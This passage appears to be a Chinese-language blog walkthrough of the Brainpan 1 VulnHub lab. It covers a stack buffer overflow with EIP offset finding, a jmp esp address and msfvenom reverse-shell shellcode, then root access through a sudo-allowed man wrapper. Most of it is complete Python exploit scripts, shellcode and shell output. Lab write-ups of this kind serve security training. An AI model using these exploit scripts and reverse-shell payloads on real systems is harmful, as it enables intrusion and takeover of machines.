y4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B(_]</span><br><span class="line">[get_reply] copied 1003 bytes to buffer</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub194.jpg"></p>
<p>再次成功地覆盖了eip。记下指令指针地址35724134，将其推入Metasploit的模式偏移工具中，这将提供为控制eip而需要发送到缓冲区的字节数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134</span></span><br><span class="line">[*] Exact match at offset 524</span><br></pre></td></tr></table></figure>

<p>知道只需要524字节的“垃圾数据”就可以成为eip。相应地编辑模糊测试器，看看是否可以用某些B（\x42）成功覆盖eip。重新运行，重新连接并启动模糊测试器。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub195.jpg"></p>
<p>瞧！如所见，已成功用4个字节的B覆盖了eip。下一个是什么？接下来，看看是否可以将自己的代码放入esp中。如果可以将代码放入esp，将查找名为jmp esp的函数调用，告诉eip指向esp，从而能够执行存储在esp中的恶意代码。编辑模糊器，使其在esp中包含一堆C（\x43），并查看是否有足够的空间容纳潜在的Shellcode。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\x42&quot;</span> * 4</span><br><span class="line">shellcode = <span class="string">&quot;\x43&quot;</span> * 500</span><br><span class="line"> </span><br><span class="line">payload = junk + eip + shellcode</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub196.jpg"></p>
<p>正如上面看到的，已经成功地用大量C填充了esp，这使知道有一些可用于放置shellcode的区域。让看看是否可以找到jmp esp函数的地址。在Immunity Debugger中，使用ctrl-f并输入搜索jmp esp。如所见，第一个jmp esp地址是311712F3。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub197.jpg"></p>
<p>下一步，生成一些shellcode，以测试概念验证（PoC）是否有效。由于要测试的PoC框是一个windoZe机器，因此将使用msfvenom生成一个简单的Windows reverse shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R -e x86/shikata_ga_nai -b &#x27;\x00&#x27; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 351 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 351</span><br><span class="line">Payload size: 351 bytes</span><br><span class="line">Final size of python file: 1712 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xba\x3a\x75\x8a\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xd1\x89\x68&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x28\xd9\x9a\xef\xd3\x21\x5b\x90\x5a\xc4\x6a\x90\x39&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x8d\xdd\x20\x49\xc3\xd1\xcb\x1f\xf7\x62\xb9\xb7\xf8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc3\x74\xee\x37\xd3\x25\xd2\x56\x57\x34\x07\xb8\x66&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf7\x5a\xb9\xaf\xea\x97\xeb\x78\x60\x05\x1b\x0c\x3c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x96\x90\x5e\xd0\x9e\x45\x16\xd3\x8f\xd8\x2c\x8a\x0f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xe1\xa6\x19\xc3\xe6\x83\xd0\x78\xdc\x78\xe3\xa8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x2c\x80\x48\x95\x80\x73\x90\xd2\x27\x6c\xe7\x2a\x54&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x11\xf0\xe9\x26\xcd\x75\xe9\x81\x86\x2e\xd5\x30\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xa8\x9e\x3f\x27\xbe\xf8\x23\xb6\x13\x73\x5f\x33\x92&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x53\xe9\x07\xb1\x77\xb1\xdc\xd8\x2e\x1f\xb2\xe5\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc0\x6b\x40\x3b\xed\x78\xf9\x66\x7a\x4c\x30\x98\x7a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xda\x43\xeb\x48\x45\xf8\x63\xe1\x0e\x26\x74\x06\x25&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9e\xea\xf9\xc6\xdf\x23\x3e\x92\x8f\x5b\x97\x9b\x5b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9b\x18\x4e\xcb\xcb\xb6\x21\xac\xbb\x76\x92\x44\xd1&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x78\xcd\x75\xda\x52\x66\x1f\x21\x35\x49\x48\x11\xa3&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x21\x8b\x61\x2a\x09\x02\x87\x46\x7d\x43\x10\xff\xe4&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xce\xea\x9e\xe9\xc4\x97\xa1\x62\xeb\x68\x6f\x83\x86&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x7a\x18\x63\xdd\x20\x8f\x7c\xcb\x4c\x53\xee\x90\x8c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x1a\x13\x0f\xdb\x4b\xe5\x46\x89\x61\x5c\xf1\xaf\x7b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x3a\x6b\xa0\xf9\xc5\x72\x25\x45\xe2\x64\xf3\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xae\xd0\xab\x10\x78\x8e\x0d\xcb\xca\x78\xc4\xa0\x84&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xec\x91\x8a\x16\x6a\x9e\xc6\xe0\x92\x2f\xbf\xb4\xad&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x80\x57\x31\xd6\xfc\xc7\xbe\x0d\x45\xf7\xf4\x0f\xec&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x90\x50\xda\xac\xfc\x62\x31\xf2\xf8\xe0\xb3\x8b\xfe&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf9\xb6\x8e\xbb\xbd\x2b\xe3\xd4\x2b\x4b\x50\xd4\x79&quot;</span></span><br></pre></td></tr></table></figure>

<p>接下来，让把它们放在一起,payload将如下所示：{junk} {jmp esp地址} {nops + buf}</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span></span><br><span class="line">buf =  b<span class="string">&quot;\x90&quot;</span> * 13</span><br><span class="line">buf += b<span class="string">&quot;\xba\x3a\x75\x8a\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xd1\x89\x68&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x28\xd9\x9a\xef\xd3\x21\x5b\x90\x5a\xc4\x6a\x90\x39&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x8d\xdd\x20\x49\xc3\xd1\xcb\x1f\xf7\x62\xb9\xb7\xf8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc3\x74\xee\x37\xd3\x25\xd2\x56\x57\x34\x07\xb8\x66&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf7\x5a\xb9\xaf\xea\x97\xeb\x78\x60\x05\x1b\x0c\x3c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x96\x90\x5e\xd0\x9e\x45\x16\xd3\x8f\xd8\x2c\x8a\x0f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xe1\xa6\x19\xc3\xe6\x83\xd0\x78\xdc\x78\xe3\xa8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x2c\x80\x48\x95\x80\x73\x90\xd2\x27\x6c\xe7\x2a\x54&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x11\xf0\xe9\x26\xcd\x75\xe9\x81\x86\x2e\xd5\x30\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xa8\x9e\x3f\x27\xbe\xf8\x23\xb6\x13\x73\x5f\x33\x92&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x53\xe9\x07\xb1\x77\xb1\xdc\xd8\x2e\x1f\xb2\xe5\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc0\x6b\x40\x3b\xed\x78\xf9\x66\x7a\x4c\x30\x98\x7a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xda\x43\xeb\x48\x45\xf8\x63\xe1\x0e\x26\x74\x06\x25&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9e\xea\xf9\xc6\xdf\x23\x3e\x92\x8f\x5b\x97\x9b\x5b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9b\x18\x4e\xcb\xcb\xb6\x21\xac\xbb\x76\x92\x44\xd1&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x78\xcd\x75\xda\x52\x66\x1f\x21\x35\x49\x48\x11\xa3&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x21\x8b\x61\x2a\x09\x02\x87\x46\x7d\x43\x10\xff\xe4&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xce\xea\x9e\xe9\xc4\x97\xa1\x62\xeb\x68\x6f\x83\x86&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x7a\x18\x63\xdd\x20\x8f\x7c\xcb\x4c\x53\xee\x90\x8c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x1a\x13\x0f\xdb\x4b\xe5\x46\x89\x61\x5c\xf1\xaf\x7b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x3a\x6b\xa0\xf9\xc5\x72\x25\x45\xe2\x64\xf3\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xae\xd0\xab\x10\x78\x8e\x0d\xcb\xca\x78\xc4\xa0\x84&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xec\x91\x8a\x16\x6a\x9e\xc6\xe0\x92\x2f\xbf\xb4\xad&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x80\x57\x31\xd6\xfc\xc7\xbe\x0d\x45\xf7\xf4\x0f\xec&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x90\x50\xda\xac\xfc\x62\x31\xf2\xf8\xe0\xb3\x8b\xfe&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf9\xb6\x8e\xbb\xbd\x2b\xe3\xd4\x2b\x4b\x50\xd4\x79&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk + eip + buf</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>启动brainpan.exe程序，在端口443上创建netcat侦听器，然后测试一下PoC代码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.56.1: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.1] 18602</span><br><span class="line">Microsoft Windows [�汾 10.0.18363.592]</span><br><span class="line">(c) 2019 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;chcp 65001</span><br><span class="line">chcp 65001</span><br><span class="line">Active code page: 65001</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;whoami  </span><br><span class="line">whoami</span><br><span class="line">iz94tylsq69z\hasee</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 7A49-F084</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\HASEE\Desktop\brainpan1</span><br><span class="line"></span><br><span class="line">2020/02/01  01:21    &lt;DIR&gt;          .</span><br><span class="line">2020/02/01  01:21    &lt;DIR&gt;          ..</span><br><span class="line">2020/01/31  20:48            21,190 brainpan.exe</span><br><span class="line">2020/02/01  01:21             2,166 etfuzz.py</span><br><span class="line">               2 File(s)         23,356 bytes</span><br><span class="line">               2 Dir(s)  151,135,014,912 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\IZ94TYLSQ69Z</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            ASPNET                   DefaultAccount           </span><br><span class="line">Guest                    HASEE                    WDAGUtilityAccount </span><br></pre></td></tr></table></figure>

<ul>
<li>注意：这个shell是测试电脑的shell，如果乱码，输入chcp 65001就不会乱码了</li>
</ul>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>好东西…。现在有一个reverse TCP连接到我们的Windows计算机。是时候创建一个Linux reverse shell了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R -e x86/alpha_upper -b &#x27;\x00&#x27; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_upper</span><br><span class="line">x86/alpha_upper succeeded with size 205 (iteration=0)</span><br><span class="line">x86/alpha_upper chosen with final size 205</span><br><span class="line">Payload size: 205 bytes</span><br><span class="line">Final size of python file: 1007 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.56.115&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span></span><br><span class="line">buf =  b<span class="string">&quot;\x90&quot;</span> * 13</span><br><span class="line">buf += b<span class="string">&quot;\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk + eip + buf</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>使用受害者主机的IP地址和更新的Shellcode更新PoC脚本，在端口443上创建一个新的netcat侦听器，并相应地执行，成功的返回了shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.56.115: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.115] 39737</span><br><span class="line">id</span><br><span class="line">uid=1002(puck) gid=1002(puck) groups=1002(puck)</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">puck@brainpan:/home/puck$ id</span><br><span class="line">id</span><br><span class="line">uid=1002(puck) gid=1002(puck) groups=1002(puck)</span><br><span class="line">puck@brainpan:/home/puck$ whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br><span class="line">puck@brainpan:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">checksrv.sh  web</span><br><span class="line">puck@brainpan:/home/puck$</span><br></pre></td></tr></table></figure>

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>成功！现在，受害者计算机上有一个特权低的shell。继续。查看主目录，看是否有有趣的事情……。不。唯一值得注意的是，有一个脚本可以在死时重新启动Web服务，以及在端口10000上运行的Web服务的根目录。sudo可以使用任何特殊权限吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> puck on this host:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User puck may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /home/anansi/bin/anansi_util</span><br></pre></td></tr></table></figure>

<p>anansi_util NOPASSWD？很有趣。仔细看看。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util</span><br><span class="line">sudo /home/anansi/bin/anansi_util</span><br><span class="line">Usage: /home/anansi/bin/anansi_util [action]</span><br><span class="line">Where [action] is one of:</span><br><span class="line">  - network</span><br><span class="line">  - proclist</span><br><span class="line">  - manual [<span class="built_in">command</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>manual [command]部分。看看是否可以使用root特权运行[command]。</li>
</ul>
<p>成功的提权并找到了flag，吊炸天！！！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util manual /bin/bash</span><br><span class="line">sudo /home/anansi/bin/anansi_util manual /bin/bash</span><br><span class="line">/usr/bin/man: manual-/bin/bash: No such file or directory</span><br><span class="line">/usr/bin/man: manual_/bin/bash: No such file or directory</span><br><span class="line">No manual entry <span class="keyword">for</span> manual</span><br><span class="line">WARNING: terminal is not fully functional</span><br><span class="line">-  (press RETURN)</span><br><span class="line">BASH(1)                                                                BASH(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       bash - GNU Bourne-Again SHell</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       bash [options] [file]</span><br><span class="line"></span><br><span class="line">COPYRIGHT</span><br><span class="line">       Bash is Copyright (C) 1989-2011 by the Free Software Foundation, Inc.</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       Bash  is  an  sh-compatible  <span class="built_in">command</span> language interpreter that executes</span><br><span class="line">       commands <span class="built_in">read</span> from the standard input or from a file.  Bash also incor‐</span><br><span class="line">       porates useful features from the Korn and C shells (ksh and csh).</span><br><span class="line"></span><br><span class="line">       Bash  is  intended  to  be a conformant implementation of the Shell and</span><br><span class="line">       Utilities portion  of  the  IEEE  POSIX  specification  (IEEE  Standard</span><br><span class="line">       1003.1).  Bash can be configured to be POSIX-conformant by default.</span><br><span class="line"></span><br><span class="line">OPTIONS</span><br><span class="line">       All  of  the  single-character shell options documented <span class="keyword">in</span> the descrip‐</span><br><span class="line">       tion of the <span class="built_in">set</span> <span class="built_in">builtin</span> <span class="built_in">command</span> can be used as options when  the  shell</span><br><span class="line"> Manual page bash(1) line 1 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)!/bin/bash</span><br><span class="line">!/bin/bash</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@brainpan:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">b.txt</span><br><span class="line">root@brainpan:~<span class="comment"># cat b.txt</span></span><br><span class="line">cat b.txt</span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                              http://www.techorganic.com </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@brainpan:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>W00T !!!!!root！二进制文件允许以root用户身份查询联机帮助页，因此，可以使用man的内置功能来内联运行命令，例如上述输出中的！/bin/bash。</p>
